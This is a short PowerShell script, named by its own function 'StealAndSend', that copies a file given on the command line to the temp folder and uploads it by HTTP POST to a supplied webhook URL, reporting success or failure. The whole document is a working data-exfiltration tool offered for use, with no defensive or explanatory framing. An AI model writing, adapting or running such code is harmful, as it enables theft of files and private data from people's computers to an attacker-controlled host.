param (
    [string]$FileSource,
    [string]$WebhookUrl
)

function StealAndSend {
    param (
        [string]$FileSource,
        [string]$WebhookUrl
    )

    try {
        if (!(Test-Path $FileSource)) {
            Write-Host "[!] File not found: $FileSource" -ForegroundColor Red
            return
        }

        $tempFile = "$env:TEMP\$([System.IO.Path]::GetFileName($FileSource))"
        Copy-Item $FileSource $tempFile -Force

        $FileStream = [System.IO.File]::OpenRead($tempFile)
        $HttpClient = New-Object System.Net.Http.HttpClient
        $Content = New-Object System.Net.Http.MultipartFormDataContent
        $FileContent = New-Object System.Net.Http.StreamContent($FileStream)
        $Content.Add($FileContent, 'file', [System.IO.Path]::GetFileName($tempFile))

        $Response = $HttpClient.PostAsync($WebhookUrl, $Content).Result

        if ($Response.IsSuccessStatusCode) {
            Write-Host "[+] File uploaded successfully." -ForegroundColor Green
        } else {
            Write-Host "[!] Upload failed: $($Response.StatusCode)" -ForegroundColor Red
        }

        $FileStream.Close()
        $HttpClient.Dispose()
    } catch {
        Write-Host "[!] Exception: $_" -ForegroundColor Red
    }
}

StealAndSend -FileSource $FileSource -WebhookUrl $WebhookUrl
